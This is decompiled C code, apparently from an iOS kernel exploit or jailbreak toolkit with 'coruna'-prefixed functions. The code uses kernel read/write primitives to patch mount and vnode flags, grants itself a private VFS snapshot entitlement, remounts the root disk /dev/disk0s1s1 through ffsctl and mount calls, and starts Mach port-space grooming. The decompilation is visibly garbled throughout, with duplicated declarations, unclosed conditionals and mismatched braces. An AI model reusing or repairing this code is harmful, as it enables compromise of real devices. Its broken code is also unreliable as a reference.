    u = coruna_call_mach_vm_machine_attribute_29df8_1aa8c(handle,val,scratch);
    err = (int)u;
  }
  if (err != 0) {
    u = 1;
  }
  return u;
}





void coruna_msu_statfs_probe(uint64_t val,uint *size)
{
  char *ptr;
  int err;
  int *err;
  uint64_t u;
  uint size;
  char scratch [10];
  char scratch [8];
  char bootargs [8];
  char thread_attr [7];
  char bootargs;
  char host_info [16];
  statfs thread_attr;
  long host_info;
  
  host_info = *(long *)k_kernel_stack_chk_guard_slot;
  _bzero(&thread_attr,0x878);
  scratch[0] = '/';
  scratch[1] = '\0';
  scratch[0] = s__private_var_MobileSoftwareUpdat_0002b0ef[8];
  scratch[1] = s__private_var_MobileSoftwareUpdat_0002b0ef[9];
  scratch[2] = s__private_var_MobileSoftwareUpdat_0002b0ef[10];
  scratch[3] = s__private_var_MobileSoftwareUpdat_0002b0ef[0xb];
  scratch[4] = s__private_var_MobileSoftwareUpdat_0002b0ef[0xc];
  scratch[5] = s__private_var_MobileSoftwareUpdat_0002b0ef[0xd];
  scratch[6] = s__private_var_MobileSoftwareUpdat_0002b0ef[0xe];
  scratch[7] = s__private_var_MobileSoftwareUpdat_0002b0ef[0xf];
  scratch[2] = s__private_var_MobileSoftwareUpdat_0002b0ef[0];
  scratch[3] = s__private_var_MobileSoftwareUpdat_0002b0ef[1];
  scratch[4] = s__private_var_MobileSoftwareUpdat_0002b0ef[2];
  scratch[5] = s__private_var_MobileSoftwareUpdat_0002b0ef[3];
  scratch[6] = s__private_var_MobileSoftwareUpdat_0002b0ef[4];
  scratch[7] = s__private_var_MobileSoftwareUpdat_0002b0ef[5];
  scratch[8] = s__private_var_MobileSoftwareUpdat_0002b0ef[6];
  scratch[9] = s__private_var_MobileSoftwareUpdat_0002b0ef[7];
  thread_attr[0] = s__private_var_MobileSoftwareUpdat_0002b0ef[0x18];
  thread_attr[1] = s__private_var_MobileSoftwareUpdat_0002b0ef[0x19];
  thread_attr[2] = s__private_var_MobileSoftwareUpdat_0002b0ef[0x1a];
  thread_attr[3] = s__private_var_MobileSoftwareUpdat_0002b0ef[0x1b];
  thread_attr[4] = s__private_var_MobileSoftwareUpdat_0002b0ef[0x1c];
  thread_attr[5] = s__private_var_MobileSoftwareUpdat_0002b0ef[0x1d];
  thread_attr[6] = s__private_var_MobileSoftwareUpdat_0002b0ef[0x1e];
  bootargs[0] = s__private_var_MobileSoftwareUpdat_0002b0ef[0x10];
  bootargs[1] = s__private_var_MobileSoftwareUpdat_0002b0ef[0x11];
  bootargs[2] = s__private_var_MobileSoftwareUpdat_0002b0ef[0x12];
  bootargs[3] = s__private_var_MobileSoftwareUpdat_0002b0ef[0x13];
  bootargs[4] = s__private_var_MobileSoftwareUpdat_0002b0ef[0x14];
  bootargs[5] = s__private_var_MobileSoftwareUpdat_0002b0ef[0x15];
  bootargs[6] = s__private_var_MobileSoftwareUpdat_0002b0ef[0x16];
  bootargs[7] = s__private_var_MobileSoftwareUpdat_0002b0ef[0x17];
  bootargs = s__private_var_MobileSoftwareUpdat_0002b0ef[0x1f];
  host_info[0] = s__private_var_MobileSoftwareUpdat_0002b0ef[0x20];
  host_info[1] = s__private_var_MobileSoftwareUpdat_0002b0ef[0x21];
  host_info[2] = s__private_var_MobileSoftwareUpdat_0002b0ef[0x22];
  host_info[3] = s__private_var_MobileSoftwareUpdat_0002b0ef[0x23];
  host_info[4] = s__private_var_MobileSoftwareUpdat_0002b0ef[0x24];
  host_info[5] = s__private_var_MobileSoftwareUpdat_0002b0ef[0x25];
  host_info[6] = s__private_var_MobileSoftwareUpdat_0002b0ef[0x26];
  err = coruna_statfs_1881c(0);
  ptr = scratch + 2;
  if (err == 0) {
    ptr = scratch;
  }
  err = _statfs(ptr,&thread_attr);
  if (err == 0) {
    if ((coruna_cat(thread_attr.f_mntfromname[7],thread_attr.f_mntfromname) != 0x7369642f7665642f
         || coruna_u64_pack71((thread_attr.f_mntfromname), (thread_attr.f_mntfromname[7])) != 0x31733173306b73
        size = 3;
        }
        *size = size;
        u = 1;
        done:
        if (*(long *)k_kernel_stack_chk_guard_slot == host_info) {
        return;
  }
  else {
    err = ___error();
    if (*err != 2) {
      u = 0;
      if (*(long *)k_kernel_stack_chk_guard_slot == host_info) {
      return;
      }
      ___stack_chk_fail(u);
    }
fail:
    size = 3;
  }
  *size = size;
  u = 1;
done:
  if (*(long *)k_kernel_stack_chk_guard_slot == host_info) {
    return;
  }
  ___stack_chk_fail(u);
}





bool coruna_kernel29bb0_via_kernel29bb0_trampoline_0001a670_2(long handle,char *path)
{
  bool err;
  int err;
  int status;
  long handle;
  uint scratch;
  long bootargs;
  
  scratch = 0;
  err = *(int *)(handle + 0x140);
  if (err - 0x1f53U < 2) {
    handle = 0x260;
  }
  else if (err == 0x1809) {
    handle = 0x208;
  }
  else {
    if (err != 0x1c1b) {
      return false;
    }
    handle = 0x200;
    if (*(unsigned long *)(handle + 0x158) < 0x1c1b1914600000) {
      handle = 0x218;
    }
  }
  err = _open(path,0x100000);
  if (err < 0) {
    err = false;
  }
  else {
    bootargs = coruna_return_zero_8dc4(handle,err);
    if ((((bootargs == 0) ||
         (status = coruna_kernel29bb0_trampoline_0001a670(handle,bootargs + handle,&bootargs), status == 0)) ||
        (handle = coruna_ptr_canonicalize(handle,bootargs), handle == 0)) ||
       (((status = coruna_kernel29bb0_trampoline_0001a670(handle,bootargs + 0xe0,&bootargs), status == 0 ||
         (handle = coruna_ptr_canonicalize(handle,bootargs), handle == 0)) ||
        (status = coruna_call_mach_vm_machine_attribute_29df8_18d98(handle,bootargs + 0x30,4,&scratch), status == 0)))) {
      err = false;
    }
    else {
      scratch = scratch & 0xffffbfff;
      status = coruna_call_mach_vm_machine_attribute_29df8_1aa94(handle,bootargs + 0x30,&scratch,4);
      err = status != 0;
    }
    _close(err);
  }
  return err;
}





long coruna_return_zero_8dc4(long handle)
{
  int err;
  long handle;
  long scratch;
  
  err = *(int *)(handle + 0x140);
  if ((err - 0x1f53U < 2 || err == 0x1c1b) || err == 0x1809) {
    scratch = coruna_fileport_makeport();
    if (scratch == 0) {
      return 0;
    }
    scratch = scratch + 0x8f8;
    err = coruna_kernel29bb0_trampoline_0001a670(handle,scratch,&scratch);
    if (err != 0) {
      handle = coruna_ptr_canonicalize(handle,scratch);
      if (handle == 0) {
        return 0;
      }
      return scratch;
    }
  }
  return 0;
}





void coruna_root_dev_disk(uint64_t val)
{
  bool err;
  int err;
  uint64_t u;
  uint size;
  char scratch [2];
  statfs bootargs;
  char thread_attr [8];
  char scratch [8];
  char bootargs [8];
  char thread_attr [7];
  char host_info;
  char host_info [8];
  long serial_buf;
  
  serial_buf = *(long *)k_kernel_stack_chk_guard_slot;
  scratch[0] = '/';
  scratch[1] = '\0';
  scratch = (char  [8])0;
  thread_attr = (char  [8])0;
  thread_attr = (char  [7])0;
  bootargs = (char  [8])0;
  host_info = s__private_var_MobileSoftwareUpdat_0002b0ef[0x1f];
  host_info._0_7_ = 0;
  _bzero(&bootargs,0x878);
  err = _statfs(scratch,&bootargs);
  if (err == 0) {
    u = coruna_statfs(val,scratch,"/dev/disk0s1s1");
    if (*(long *)k_kernel_stack_chk_guard_slot == serial_buf) {
    return;
    }
    ___stack_chk_fail(u);
  }
  u = 0;
fail:
  if (*(long *)k_kernel_stack_chk_guard_slot == serial_buf) {
    return;
  }
  ___stack_chk_fail(u);
}





uint64_t coruna_statfs(long handle,char *path,char *str_2)
{
  int err;
  int status;
  size_t ls3;
  long handle;
  uint64_t u;
  int scratch;
  statfs bootargs;
  long thread_attr;
  
  thread_attr = *(long *)k_kernel_stack_chk_guard_slot;
  _bzero(&bootargs,0x878);
  scratch = 0;
  err = *(int *)(handle + 0x140);
  if (((((1 < err - 0x1f53U && err != 0x1c1b) && err != 0x1809) ||
       (err = _statfs(path,&bootargs), err != 0)) ||
      (ls3 = _strlen(str_2), 0x3ff < ls3)) || (err = _open(path,0), err < 1)) {
    u = 0;
    if (*(long *)k_kernel_stack_chk_guard_slot == thread_attr) {
    return u;
    }
    ___stack_chk_fail();
  }
  handle = coruna_fileport_makeport(handle,err);
  if (handle == 0) {
done:
    u = 0;
  }
  else {
    status = coruna_call_mach_vm_machine_attribute_29df8_18d98(handle,handle + 0x4e4,4,&scratch);
    if ((status == 0) || (scratch != bootargs.f_mntfromname)) goto done;
    u = coruna_call_mach_vm_machine_attribute_29df8_1aa94(handle,handle + 0x4e4,str_2,(int)ls3 + 1);
  }
  _close(err);
fail:
  if (*(long *)k_kernel_stack_chk_guard_slot == thread_attr) {
    return u;
  }
  ___stack_chk_fail();
}





void coruna_statfs_10158(char *path)
{
  bool err;
  int err;
  statfs scratch;
  long bootargs;
  
  bootargs = *(long *)k_kernel_stack_chk_guard_slot;
  _bzero(&scratch,0x878);
  err = _statfs(path,&scratch);
  if (err == 0) {
    if (coruna_cat(scratch.f_mntfromname[7],scratch.f_mntfromname) == 0x7369642f7665642f
        && coruna_u64_pack71((scratch.f_mntfromname), (scratch.f_mntfromname[7])) == 0x31733173306b73)
    {
      err = _strcmp(path,scratch.f_mntonname);
      err = err == 0;
      if (*(long *)k_kernel_stack_chk_guard_slot == bootargs) {
      return;
      }
      ___stack_chk_fail(err);
    }
  }
  else {
    ___error();
  }
  err = false;
fail:
  if (*(long *)k_kernel_stack_chk_guard_slot == bootargs) {
    return;
  }
  ___stack_chk_fail(err);
}





int * coruna_chown_rmdir(long handle,int flags)
{
  uint8_t *ptr;
  bool err;
  int err;
  uint u;
  int status;
  int *err;
  unsigned long size;
  char *ptr;
  char *buf;
  uint64_t version;
  int *status;
  int flags;
  char scratch [3];
  char bootargs;
  statfs *thread_attr;
  char host_info [8];
  char scratch [8];
  char bootargs [8];
  char thread_attr [7];
  char serial_buf;
  char host_info [8];
  char *action;
  char *block_ctx;
  char *stack_guard;
  char *sa_saved;
  char *sa_new;
  uint64_t scratch;
  long path_buf;
  
  path_buf = *(long *)k_kernel_stack_chk_guard_slot;
  bootargs = '\0';
  scratch = (char  [8])0;
  host_info = (char  [8])0;
  thread_attr = (char  [7])0;
  bootargs = (char  [8])0;
  serial_buf = s__private_var_MobileSoftwareUpdat_0002b0ef[0x1f];
  host_info._0_7_ = 0;
  scratch[0] = '/';
  scratch[1] = '\0';
  coruna_ctx_set_flag(handle,0x400);
  ptr = k_kernel_mach_task_self_slot;
  err = (int *)coruna_kernel29bb0_via_return_zero_2b0c0(handle,*(uint32_t *)k_kernel_mach_task_self_slot,
                               "<dict><key>com.apple.private.vfs.snapshot</key><true/></dict>",0,8);
  if ((((int)err == 0) || (err = (int *)coruna_call_getattrlistbulk_39278(), (int)err == 0)) ||
     ((err = coruna_statfs_1881c(scratch + 3), err != 0 &&
      ((bootargs == '\0' && (err = (int *)coruna_root_dev_disk(handle), (int)err == 0))))))
  status = (int *)0x0;
  if (*(long *)k_kernel_stack_chk_guard_slot != path_buf) {
  ___stack_chk_fail(err);
  }
  return status;
}





uint64_t coruna_root_dev_disk_9504(uint64_t val,uint64_t id_2)
{
  int err;
  uint64_t u;
  uint32_t scratch;
  
  scratch = 0;
  u = coruna_return_zero_10aac(val,id_2,1,&scratch);
  if ((int)u != 0) {
    err = coruna_mount_apfs("/dev/disk0s1s1",id_2,0x110001);
    if (err == 0) {
      u = 1;
    }
    else {
      coruna_return_zero_10aac(val,id_2,scratch,0);
      u = 0;
    }
  }
  return u;
}





bool coruna_ffsctl_root(long handle,uint size)
{
  bool err;
  uint u;
  int err;
  int status;
  long handle;
  uint64_t size;
  char *ptr;
  unsigned long version;
  unsigned long port;
  uint scratch;
  uint32_t bootargs;
  statfs *thread_attr;
  
  thread_attr = (statfs *)0x0;
  u = _getmntinfo(&thread_attr,0);
  if (u == 0) {
    version = 1;
  }
  else {
    port = (unsigned long)u;
    ptr = thread_attr->f_mntonname;
    version = 1;
    do {
      err = _strcmp("/",ptr);
      if (err == 0) {
        version = (unsigned long)((byte)*(uint32_t *)(ptr + -0x18) & 1);
      }
      ptr = ptr + 0x878;
      port = port - 1;
    } while (port != 0);
  }
  u = coruna_root_is_apfs();
  bootargs = 0;
  if ((~(uint)version & 1) == size) {
    return true;
  }
  if (size == 0) {
    if ((u != 0) && (err = coruna_return_zero_10aac(handle,"/",1,&bootargs), err == 0)) {
      return false;
    }
    size = 0x10010001;
    err = -1;
  }
  else {
    err = _open("/",0);
    if (err == -1) {
      return false;
    }
    status = *(int *)(handle + 0x140);
    if (((1 < status - 0x1f53U) && (status != 0x1c1b)) && (status != 0x1809)) {
      return false;
    }
    handle = coruna_fileport_makeport(handle,err);
    if (handle == 0) {
      return false;
    }
    version = handle + 0x70;
    if (version == 0) {
      return false;
    }
    status = coruna_kernel29bb0_via_ioconnectcallmethod(handle,version,&scratch);
    if (status == 0) {
      return false;
    }
    scratch = scratch & 0xffffbfff;
    status = coruna_mach_vm_machine_attribute(handle,version);
    if (status == 0) {
      return false;
    }
    status = _open("/",0);
    if (-1 < status) {
      thread_attr = (statfs *)((unsigned long)thread_attr & 0xffffffff00000000);
      _ffsctl(status,0x80046814,&thread_attr,0);
      thread_attr = 1;
      _ffsctl(status,0x80046815,&thread_attr,0);
      thread_attr = (statfs *)coruna_u64_pack((thread_attr), (2));
      if (u != 0) {
        _ffsctl(status,0x80044a11,&thread_attr,0);
        thread_attr = (statfs *)coruna_u64_pack((thread_attr), (3));
      }
      _ffsctl(status,0x80046816,&thread_attr,0);
      _close(status);
    }
    size = 0x10000;
  }
  if (u == 0) {
    status = coruna_mount_hfs("/dev/disk0s1s1","/",size);
  }
  else {
    status = coruna_mount_apfs();
  }
  err = status != -1;
  if (size == 0) {
    if (err || ((u ^ 1) & 1) != 0) {
      return err;
    }
    err = coruna_return_zero_10aac(handle,"/",bootargs,0);
    if (err != 0) {
      return err;
    }
  }
  else {
    status = coruna_kernel29bb0_via_ioconnectcallmethod(handle,version,&scratch);
    if (status != 0) {
      scratch = scratch | 0x4000;
      status = coruna_mach_vm_machine_attribute(handle,version);
      if (status != 0) {
        _close(err);
        return err;
      }
    }
  }
  return false;
}





uint64_t coruna_msu_mnt1_path(uint64_t val,void *ctx,uint *size,int *flags)
{
  int err;
  int status;
  size_t ls3;
  uint64_t u;
  char *ptr;
  unsigned long size;
  
  err = coruna_statfs_1881c(0);
  if (err == 0) {
    ptr = "/";
fail:
    ls3 = _strlen(ptr);
    size = ls3 + 1;
    if (*size < size) {
      u = 0;
      if (flags != (int *)0x0) {
      *flags = err;
      }
      return u;
    }
    _memcpy(ctx,ptr,size);
  }
  else {
    status = coruna_statfs_10158("/private/var/MobileSoftwareUpdate/mnt1");
    if (status != 0) {
      ptr = "/private/var/MobileSoftwareUpdate/mnt1/";
      goto fail;
    }
    size = 0;
  }
  *size = (uint)size;
  u = 1;
joined_r0x000098c0:
  if (flags != (int *)0x0) {
    *flags = err;
  }
  return u;
}





uint64_t coruna_fileport_makeport(long handle,uint64_t val)
{
  int err;
  long handle;
  uint64_t u;
  uint64_t scratch;
  long bootargs;
  mach_port_name_t thread_attr;
  
  thread_attr = 0;
  err = _fileport_makeport(val,&thread_attr);
  if ((err == 0) && (thread_attr != 0)) {
    handle = coruna_kernel29bb0_via_return_zero_1f078(handle);
    if (handle == 0) {
fail:
      u = 0;
    }
    else {
      err = *(int *)(handle + 0x140);
      if ((1 < err - 0x1f53U && err != 0x1c1b) && err != 0x1809) goto done;
      err = coruna_kernel29bb0_trampoline_0001a670(handle,handle + 0x38,&bootargs);
      if (((err == 0) || (handle = coruna_ptr_canonicalize(handle,bootargs), handle == 0)) ||
         (err = coruna_kernel29bb0_trampoline_0001a670(handle,bootargs + 0xd8,&scratch), err == 0))
      goto fail;
      handle = coruna_ptr_canonicalize(handle,scratch);
      u = 0;
      if (handle != 0) {
        u = scratch;
      }
    }
    _mach_port_destroy(*(ipc_space_t *)k_kernel_mach_task_self_slot,thread_attr);
  }
  else {
done:
    u = 0;
  }
  return u;
}





uint64_t coruna_return_zero_10aac(long handle,char *path,uint64_t val,uint *size)
{
  int err;
  int status;
  long handle;
  long addr;
  uint64_t u;
  uint scratch;
  
  err = _open(path,0);
  if (err == -1) {
    return 0;
  }
  handle = coruna_return_zero_8dc4(handle,err);
  if (handle != 0) {
    status = *(int *)(handle + 0x140);
    if (status - 0x1f53U < 2) {
      addr = 0x224;
    }
    else if (status == 0x1809) {
      addr = 0x1c8;
    }
    else {
      u = 0;
      _close(err);
      return u;
    }
    status = coruna_kernel29bb0_via_ioconnectcallmethod(handle,addr + handle,&scratch);
    u = 0;
    _close(err);
    return u;
  }
fail:
  u = 0;
done:
  _close(err);
  return u;
}





uint coruna_mach_port_space_basic_info(long handle)
{
  uint8_t *ptr;
  uid_t u;
  uint size;
  uint version;
  int err;
  int *err;
  uint *buf;
  size_t scratch;
  uint32_t bootargs;
  int thread_attr;
  uint64_t host_info;
  int serial_buf;
  
  if ((*(char *)(handle + 10) == '\0') && (u = _getuid(), u == 0)) {
    bootargs = 0xa000;
    thread_attr = 0;
    scratch = 4;
    host_info = k_kernel_rodata_word_2adf0;
    err = _sysctl((int *)&host_info,2,&thread_attr,&scratch,(void *)0x0,0);
    if ((err != 0) ||
       ((thread_attr < 0xa000 &&
        (err = _sysctl((int *)&host_info,2,(void *)0x0,(size_t *)0x0,&bootargs,4), err != 0)))) {
      err = ___error();
      err = *err;
      buf = (uint *)___error();
      size = -*buf;
      if (-1 < err) {
        size = *buf;
      }
      return size | 0x40000000;
    }
  }
  ptr = k_kernel_mach_task_self_slot;
  size = _mach_port_space_basic_info(*(uint32_t *)k_kernel_mach_task_self_slot,&host_info);
  if (size == 0) {
    if ((uint)(host_info - serial_buf) >> 4 < 0x2bd) {
      version = _task_set_port_space(*(ipc_space_t *)ptr,serial_buf + 0x2bd0);
      size = 0;
      if (version != 0) {
        size = version | 0x80000000;
      }
    }
    else {
      size = 0;
    }
  }
  else {
    size = size | 0x80000000;
  }
  return size;
}
uint8_t * coruna_mach_port_request_notification(uint64_t val,uint64_t id_2,uint size,uint32_t *size_x)
{
  char *ptr;
  unsigned long *ptr;
  long *ptr;
  uint32_t *buf;
  mach_port_t *lpm5;
  vm_address_t *buf;
  uint8_t *str;
  vm_size_t size;
  long handle;
  long addr;
  vm_map_t target_task;
  ipc_space_t task;
  uint u;
  vm_address_t lv11;
  bool err;
  int err;
  uint size;
  mach_port_t lm15;
  int status;
  uint version;
  mach_port_name_t lm18;
  uint port;
  int flags;
  host_priv_t host_priv;
  long off;
  uint8_t *copy;
  uint64_t tag;
  int *err;
  uint *data;
  void **lppv26;
  uint *obj;
  void *str;
  memory_object_offset_t *lpm29;
  uint16_t kind;
  int count;
  uint8_t *block;
  size_t *lps33;
  unsigned long type_id;
  long base;
  unsigned long type_id_8;
  uint16_t type_id_9;
  uint8_t *entry;
  ipc_space_t *status;
  vm_map_t *copy;
  uint32_t *entry_9;
  long ctx_val;
  pthread_t p_Var43;
  pthread_t *pp_Var44;
  semaphore_t *lps45;
  unsigned long type_id_10;
  uint8_t *entry_10;
  uint32_t *entry_11;
  size_t size_00;
  long serial;
  vm_address_t lv50;
  long serial_7;
  unsigned long type_id_11;
  unsigned long type_id_12;
  pthread_attr_t *ptr;
  unsigned long type_id_13;
  uint8_t *entry_12;
  long serial_8;
  long serial_9;
  double ld59;
  double ld60;
  uint32_t *in_stack_ffffffffffff8b20;
  uint32_t *entry_13;
  unsigned long scratch;
  uint bootargs;
  uint32_t thread_attr;
  uint64_t host_info;
  uint64_t serial_buf;
  uint64_t scratch;
  uint64_t action;
  uint64_t bootargs;
  uint64_t thread_attr;
  uint64_t host_info;
  uint64_t block_ctx;
  uint64_t serial_buf;
  uint64_t action;
  uint64_t block_ctx;
  uint64_t stack_guard;
  uint64_t stack_guard;
  uint64_t sa_saved;
  uint64_t sa_new;
  uint64_t sa_saved;
  uint64_t path_buf;
  uint64_t tmp_buf;
  uint64_t region;
  uint64_t sa_new;
  uint64_t plist;
  uint64_t url_buf;
  uint64_t json_buf;
  uint64_t path_buf;
  uint64_t frame;
  uint64_t work;
  uint64_t cache;
  uint64_t tmp_buf;
  uint64_t cache_20;
  uint64_t cache_21;
  uint64_t cache_22;
  uint64_t region;
  uint64_t cache_23;
  uint64_t cache_24;
  uint64_t cache_25;
  uint64_t plist;
  uint64_t cache_26;
  uint64_t cache_27;
  uint64_t cache_28;
  uint64_t url_buf;
  uint64_t cache_29;
  uint64_t cache_30;
  uint64_t cache_31;
  uint64_t json_buf;
  uint64_t cache_32;
  uint64_t cache_33;
  uint64_t cache_34;
  uint64_t frame;
  uint64_t cache_35;
  uint64_t cache_36;
  uint64_t cache_37;
  uint64_t work;
  uint64_t cache_38;
  uint64_t cache_39;
  uint64_t cache_40;
  uint64_t cache;
  uint64_t cache_41;
  uint64_t cache_42;
  uint64_t cache_43;
  uint64_t cache_20;
  uint64_t cache_44;
  uint64_t cache_45;
  uint64_t cache_46;
  uint64_t cache_21;
  uint64_t cache_22;
  long cache_23;
  long cache_24;
  vm_map_t cache_25;
  vm_address_t cache_26;
  vm_address_t cache_27;
  vm_address_t cache_28;
  uint64_t cache_47;
  uint64_t cache_29;
  uint64_t cache_48;
  uint64_t cache_49;
  uint64_t cache_50;
  uint64_t cache_30;
  uint64_t cache_51;
  unsigned long cache_52;
  unsigned long cache_31;
  unsigned long cache_32;
  uint64_t cache_53;
  unsigned long cache_33;
  uint64_t cache_54;
  uint64_t cache_34;
  uint64_t cache_35;
  uint64_t cache_36;
  long cache_37;
  long cache_38;
  uint64_t cache_39;
  uint64_t cache_40;
  uint64_t cache_41;
  int *cache_42;
  uint cache_43;
  uint64_t cache_44;
  vm_address_t cache_45;
  vm_address_t cache_46;
  uint32_t cache_47;
  unsigned long cache_48;
  size_t cache_49;
  size_t cache_50;
  uint32_t cache_51;
  uint64_t cache_52;
  unsigned long cache_53;
  unsigned long cache_54;
  uint8_t *cache_55;
  uint8_t *cache_56;
  uint32_t cache_57;
  semaphore_t cache_58;
  semaphore_t cache_59;
  pthread_t cache_60 [4];
  uint32_t cache_61[2];
  vm_address_t cache_62;
  size_t cache_63 [17];
  uint8_t cache_64[64];
  uint8_t cache_65[64];
  semaphore_t cache_66 [16];
  mach_port_name_t cache_67 [2];
  vm_address_t cache_68 [2];
  vm_size_t cache_69 [2];
  size_t cache_70 [2];
  uint32_t cache_71[2];
  unsigned long cache_72;
  uint32_t cache_73;
  uint8_t cache_74[4];
  char cache_75 [4];
  mach_port_name_t cache_76 [2];
  uint8_t cache_77[20];
  mach_port_name_t cache_78 [2];
  vm_address_t cache_79 [2];
  uint32_t cache_80[3];
  uint8_t cache_81[1016];
  uint cache_82 [5];
  long cache_83;
  uint8_t cache_84[256];
  long cache_85 [2];
  uint32_t cache_86;
  uint8_t cache_87[12];
  unsigned long cache_88 [2];
  char cache_89 [8];
  long cache_90;
  int cache_91 [2];
  memory_object_offset_t cache_92 [2];
  size_t cache_93;
  mach_vm_address_t cache_94;
  vm_map_t cache_95 [4358];
  uint8_t cache_96[8];
  mach_vm_address_t cache_97;
  uint64_t cache_55;
  uint64_t cache_98;
  uint64_t cache_56;
  uint64_t cache_99;
  uint64_t cache_57;
  uint64_t cache_100;
  uint64_t cache_58;
  uint64_t cache_101;
  uint64_t cache_59;
  uint64_t cache_102;
  uint64_t cache_60;
  uint64_t cache_103;
  uint64_t cache_61;
  uint64_t cache_104;
  uint64_t cache_62;
  uint64_t cache_105;
  uint64_t cache_63;
  uint64_t cache_106;
  uint64_t cache_64;
  uint64_t cache_107;
  uint64_t cache_65;
  uint64_t cache_108;
  uint64_t cache_66;
  uint64_t cache_109;
  uint64_t cache_67;
  uint64_t cache_110;
  uint64_t cache_68;
  uint64_t cache_111;
  uint64_t cache_69;
  uint64_t cache_112;
  uint64_t cache_70;
  uint64_t cache_113;
  uint64_t cache_71;
  uint64_t cache_114;
  uint64_t cache_72;
  uint64_t cache_115;
  uint64_t cache_73;
  uint64_t cache_116;
  uint64_t cache_74;
  uint64_t cache_117;
  uint64_t cache_75;
  uint64_t cache_118;
  uint64_t cache_76;
  uint64_t cache_119;
  uint64_t cache_77;
  uint64_t cache_120;
  uint64_t cache_78;
  uint64_t cache_121;
  uint64_t cache_79;
  uint64_t cache_122;
  uint64_t cache_80;
  uint64_t cache_123;
  uint64_t cache_81;
  uint64_t cache_124;
  uint64_t cache_82;
  uint64_t cache_125;
  uint64_t cache_83;
  uint64_t cache_126;
  uint64_t cache_84;
  uint64_t cache_127;
  uint64_t cache_85;
  uint64_t cache_128;
  uint64_t cache_86;
  void *cache_129;
  uint64_t cache_87;
  uint64_t cache_130;
  uint64_t cache_88;
  uint64_t cache_131;
  uint64_t cache_89;
  uint64_t cache_132;
  uint64_t cache_90;
  uint64_t cache_133;
  uint64_t cache_91;
  uint64_t cache_134;
  uint64_t cache_92;
  uint64_t cache_135;
  uint64_t cache_93;
  uint64_t cache_136;
  uint64_t cache_94;
  uint64_t cache_137;
  uint64_t cache_95;
  uint64_t cache_138;
  uint64_t cache_96;
  uint64_t cache_139;
  uint64_t cache_97;
  uint64_t cache_140;
  uint64_t cache_98;
  uint64_t cache_141;
  uint64_t cache_99;
  uint64_t cache_142;
  uint64_t cache_100;
  uint64_t cache_143;
  uint64_t cache_101;
  uint64_t cache_144;
  uint64_t cache_102;
  uint64_t cache_145;
  uint64_t cache_103;
  uint64_t cache_146;
  uint64_t cache_104;
  uint64_t cache_147;
  uint64_t cache_105;
  uint64_t cache_148;
  uint64_t cache_106;
  uint64_t cache_149;
  uint64_t cache_107;
  uint64_t cache_150;
  uint64_t cache_108;
  uint64_t cache_151;
  uint64_t cache_109;
  uint64_t cache_152;
  uint64_t cache_110;
  uint64_t cache_153;
  uint64_t cache_111;
  uint64_t cache_154;
  uint64_t cache_112;
  uint64_t cache_155;
  uint64_t cache_113;
  uint64_t cache_156;
  uint64_t cache_114;
  uint64_t cache_157;
  uint64_t cache_115;
  uint64_t cache_158;
  uint64_t cache_116;
  uint64_t cache_159;
  uint64_t cache_117;
  uint64_t cache_160;
  uint64_t cache_118;
  uint64_t cache_161;
  uint cache_162;
  pthread_attr_t cache_163 [128];
  long cache_164;
  
  off = (*(void (*)k_kernel_chkstk_darwin_slot)();
  cache_164 = *(long *)k_kernel_stack_chk_guard_slot;
  copy = (uint8_t *)coruna_mach_port_space_basic_info();
  if ((int)copy == 0) {
    thread_attr = 0;
    serial_8 = 0;
    entry_12 = cache_77;
    lps45 = cache_66;
    entry = cache_81;
    entry_9 = cache_80 + 1;
    block = cache_64;
    serial_7 = 0x38;
    status = (ipc_space_t *)k_kernel_mach_task_self_slot;
    type_id_11 = 0;
fail:
    pp_Var44 = cache_60 + type_id_11 * 0xf2;
    _bzero(pp_Var44,0x790);
    if ((type_id_11 != 0) && ((int)copy != 0x2e001)) {
      type_id_8 = (unsigned long)((int)type_id_11 - 1);
      *pp_Var44 = cache_60[type_id_8 * 0xf2];
      cache_60[type_id_11 * 0xf2 + 2] = cache_60[type_id_8 * 0xf2 + 2];
      cache_60[type_id_11 * 0xf2 + 3] = cache_60[type_id_8 * 0xf2 + 3];
      cache_60[type_id_8 * 0xf2] = (pthread_t)0x0;
      cache_60[type_id_8 * 0xf2 + 3] = (pthread_t)0x0;
    }
    serial = 0;
    cache_41 = 0;
    type_id_8 = type_id_11 + 1;
    cache_40 = 0;
    cache_39 = 0;
    cache_38 = 0;
    cache_37 = 0;
    cache_36 = 0;
    cache_35 = 0;
    cache_34 = 0;
    cache_53 = 0;
    cache_32 = 0;
    cache_54 = 0;
    cache_33 = 0;
    cache_51 = 0;
    cache_30 = 0;
    cache_31 = 0;
    cache_52 = 0;
    cache_48 = 0;
    cache_29 = 0;
    cache_50 = 0;
    cache_49 = 0;
    cache_47 = 0;
    cache_28 = 0;
    cache_27 = 0;
    cache_26 = 0;
    cache_25 = 0;
    cache_24 = 0;
    cache_89[type_id_11 * 0x790] = '\x01';
    ptr = cache_89 + type_id_11 * 0x790;
    cache_23 = 0;
    do {
      err = _mach_reply_port();
      if (err + 1U < 2) {
        copy = (uint8_t *)0x28008;
        goto exit_ok;
      }
      *(int *)(entry_12 + serial) = err;
      serial = serial + 4;
    } while (serial != 0x14);
    tag = _mach_reply_port();
    lm18 = (mach_port_name_t)tag;
    if (lm18 + 1 < 2) {
      copy = (uint8_t *)0x28008;
      goto exit_ok;
    }
    cache_78[type_id_11 * 0x1e4] = lm18;
    size = _mach_port_insert_right(*status,lm18,lm18,0x14);
    if (size == 0) {
      cache_80[type_id_11 * 0x1e4] = 2000;
      size = _vm_allocate(*status,&cache_27,8000,1);
      lv11 = cache_27;
      if (size != 0) {
        copy = (uint8_t *)(unsigned long)(size | 0x80000000);
        goto exit_ok;
      }
      cache_79[type_id_11 * 0xf2] = cache_27;
      size = _vm_allocate(*status,&cache_26,8000,1);
      lv50 = cache_26;
      if (size == 0) {
        cache_79[type_id_11 * 0xf2 + 1] = cache_26;
        ptr = cache_85 + type_id_11 * 0xf2;
        copy = (uint8_t *)coruna_kernel29bb0_via_ctx_set_flag(off,pp_Var44,tag,ptr);
        if (((int)copy == 0) &&
           (copy = (uint8_t *)coruna_mach_port_deallocate_115f4(off,2000),
           copy = (vm_map_t *)k_kernel_mach_task_self_slot, (int)copy == 0)) {
          tag = coruna_host_priv_statistics_11020(off);
          copy = (uint8_t *)
                    coruna_kernel29bb0_via_host_priv_statistics(off,lv11,lv50,2000,tag,(long)&cache_41 + 4,&cache_41,
                                 (long)&cache_40 + 4,&cache_40);
          if ((int)copy == 0) {
            cache_82[type_id_11 * 0x1e4 + 3] = (uint)cache_41;
            cache_82[type_id_11 * 0x1e4 + 4] = cache_40;
            if ((uint)cache_41 < 0x81) {
